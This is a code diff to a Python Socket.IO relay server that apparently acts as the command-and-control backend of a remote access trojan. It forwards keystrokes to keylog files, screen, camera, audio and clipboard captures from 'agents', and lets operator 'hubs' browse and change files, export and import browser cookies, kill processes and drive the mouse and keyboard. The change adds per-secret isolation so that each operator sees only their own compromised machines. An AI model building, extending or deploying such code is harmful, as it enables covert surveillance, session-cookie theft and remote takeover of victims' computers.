@@ -39,13 +39,39 @@ socketio = SocketIO(
     max_http_buffer_size=10 * 1024 * 1024,
 )
 
-agents = {}       # sid -> {"name": str}
+agents = {}       # sid -> {"name": str, "secret": str}
 name_to_sid = {}  # name -> sid
+hub_secrets = {}  # hub_sid -> secret
 HUB_ROOM = "hubs"
 
 
-def _agent_list():
-    return [{"name": v["name"]} for v in agents.values()]
+def _hub_room(secret):
+    """Room name for hubs sharing a secret."""
+    return f"hubs:{secret}" if secret else HUB_ROOM
+
+
+def _agent_list(secret=None):
+    """Return agents visible to a given secret (or all if no secret filtering)."""
+    return [
+        {"name": v["name"]}
+        for v in agents.values()
+        if secret is None or v.get("secret", "") == secret
+    ]
+
+
+def _agent_secret(target_name):
+    """Get the secret of a named agent."""
+    sid = name_to_sid.get(target_name)
+    if sid:
+        return agents.get(sid, {}).get("secret", "")
+    return None
+
+
+def _hub_may_reach(hub_sid, target_name):
+    """True if the hub's secret matches the target agent's secret."""
+    hub_secret = hub_secrets.get(hub_sid, "")
+    agent_secret = _agent_secret(target_name)
+    return agent_secret is not None and hub_secret == agent_secret
 
 
 def _keylog_path(agent_name):
@@ -375,18 +401,21 @@ def keylog_report(agent_name):
 def on_register(data):
     sid = freq.sid
     name = str(data.get("name", "agent"))
-    agents[sid] = {"name": name}
+    secret = str(data.get("secret", ""))
+    agents[sid] = {"name": name, "secret": secret}
     name_to_sid[name] = sid
     emit("registered", {"name": name})
-    socketio.emit("agent_list", _agent_list(), room=HUB_ROOM)
+    socketio.emit("agent_list", _agent_list(secret), room=_hub_room(secret))
 
 
 # ── Hub join ──────────────────────────────────────────────────────────────────
 
 @socketio.on("hub_join")
-def on_hub_join(_data=None):
-    join_room(HUB_ROOM)
-    emit("agent_list", _agent_list())
+def on_hub_join(data=None):
+    secret = str((data or {}).get("secret", ""))
+    hub_secrets[freq.sid] = secret
+    join_room(_hub_room(secret))
+    emit("agent_list", _agent_list(secret))
 
 
 # ── Disconnect ────────────────────────────────────────────────────────────────
@@ -394,11 +423,13 @@ def on_hub_join(_data=None):
 @socketio.on("disconnect")
 def on_disconnect():
     sid = freq.sid
+    hub_secrets.pop(sid, None)
     info = agents.pop(sid, None)
     if info:
         if name_to_sid.get(info["name"]) == sid:
             del name_to_sid[info["name"]]
-        socketio.emit("agent_list", _agent_list(), room=HUB_ROOM)
+        secret = info.get("secret", "")
+        socketio.emit("agent_list", _agent_list(secret), room=_hub_room(secret))
 
 
 # ── Agent → Hub forwarding ────────────────────────────────────────────────────
@@ -408,11 +439,13 @@ def _make_fwd(event):
         sid = freq.sid
         if not isinstance(data, dict):
             data = {}
-        agent_name = agents.get(sid, {}).get("name", "?")
+        agent_info = agents.get(sid, {})
+        agent_name = agent_info.get("name", "?")
+        secret = agent_info.get("secret", "")
         data["_agent"] = agent_name
         if event == "key":
             _append_keylog(agent_name, dict(data))
-        socketio.emit(event, data, room=HUB_ROOM)
+        socketio.emit(event, data, room=_hub_room(secret))
     _handler.__name__ = f"fwd_{event}"
     return _handler
 
@@ -425,7 +458,7 @@ for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio", "
 def _to_agent(data, event=None):
     target_name = data.get("_target")
     target_sid = name_to_sid.get(target_name)
-    if target_sid:
+    if target_sid and _hub_may_reach(freq.sid, target_name):
         ev = event or "command"
         socketio.emit(ev, data, room=target_sid)
 
@@ -460,8 +493,9 @@ def on_mic_off(data):
 @socketio.on("get_processes")
 def on_get_processes(data):
     requester = freq.sid
-    target_sid = name_to_sid.get(data.get("_target"))
-    if target_sid:
+    target_name = data.get("_target")
+    target_sid = name_to_sid.get(target_name)
+    if target_sid and _hub_may_reach(requester, target_name):
         socketio.emit("get_processes", {"_requester": requester}, room=target_sid)
 
 
@@ -474,16 +508,18 @@ def on_processes_result(data):
 
 @socketio.on("kill_process")
 def on_kill_process(data):
-    target_sid = name_to_sid.get(data.get("_target"))
-    if target_sid:
+    target_name = data.get("_target")
+    target_sid = name_to_sid.get(target_name)
+    if target_sid and _hub_may_reach(freq.sid, target_name):
         socketio.emit("kill_process", data, room=target_sid)
 
 
 # ── File manager (request/response) ──────────────────────────────────────────
 
 def _fm_request(event, data):
-    target_sid = name_to_sid.get(data.get("_target"))
-    if target_sid:
+    target_name = data.get("_target")
+    target_sid = name_to_sid.get(target_name)
+    if target_sid and _hub_may_reach(freq.sid, target_name):
         data["_requester"] = freq.sid
         socketio.emit(event, data, room=target_sid)
 
@@ -514,8 +550,9 @@ for _rsev in ("dir_result", "file_data", "write_result", "delete_result"):
 
 @socketio.on("export_cookies")
 def on_export_cookies(data):
-    target_sid = name_to_sid.get(data.get("_target") if data else None)
-    if target_sid:
+    target_name = (data or {}).get("_target")
+    target_sid = name_to_sid.get(target_name)
+    if target_sid and _hub_may_reach(freq.sid, target_name):
         socketio.emit("export_cookies", {"_requester": freq.sid}, room=target_sid)
 
 @socketio.on("cookies_data")
@@ -526,8 +563,9 @@ def on_cookies_data(data):
 
 @socketio.on("import_cookies")
 def on_import_cookies(data):
-    target_sid = name_to_sid.get(data.get("_target") if data else None)
-    if target_sid:
+    target_name = (data or {}).get("_target")
+    target_sid = name_to_sid.get(target_name)
+    if target_sid and _hub_may_reach(freq.sid, target_name):
         data["_requester"] = freq.sid
         socketio.emit("import_cookies", data, room=target_sid)
 
@@ -543,8 +581,9 @@ def on_import_result(data):
 @socketio.on("list_windows")
 def on_list_windows(data):
     requester = freq.sid
-    target_sid = name_to_sid.get(data.get("_target"))
-    if target_sid:
+    target_name = data.get("_target")
+    target_sid = name_to_sid.get(target_name)
+    if target_sid and _hub_may_reach(requester, target_name):
         socketio.emit("list_windows", {"_requester": requester}, room=target_sid)
 
 @socketio.on("windows_list")
@@ -556,8 +595,9 @@ def on_windows_list(data):
 for _wcev in ("win_key", "win_mouse", "desktop_cmd", "win_capture_start", "win_capture_stop"):
     def _make_wc_handler(ev):
         def _h(data):
-            target_sid = name_to_sid.get(data.get("_target"))
-            if target_sid:
+            target_name = data.get("_target")
+            target_sid = name_to_sid.get(target_name)
+            if target_sid and _hub_may_reach(freq.sid, target_name):
                 socketio.emit(ev, data, room=target_sid)
         _h.__name__ = f"wc_{ev}"
         return _h
@@ -568,8 +608,9 @@ for _wcev in ("win_key", "win_mouse", "desktop_cmd", "win_capture_start", "win_c
 
 def _make_req_resp(req_event, resp_event):
     def _on_req(data):
-        target_sid = name_to_sid.get((data or {}).get("_target"))
-        if target_sid:
+        target_name = (data or {}).get("_target")
+        target_sid = name_to_sid.get(target_name)
+        if target_sid and _hub_may_reach(freq.sid, target_name):
             payload = dict(data) if data else {}
             payload["_requester"] = freq.sid
             socketio.emit(req_event, payload, room=target_sid)
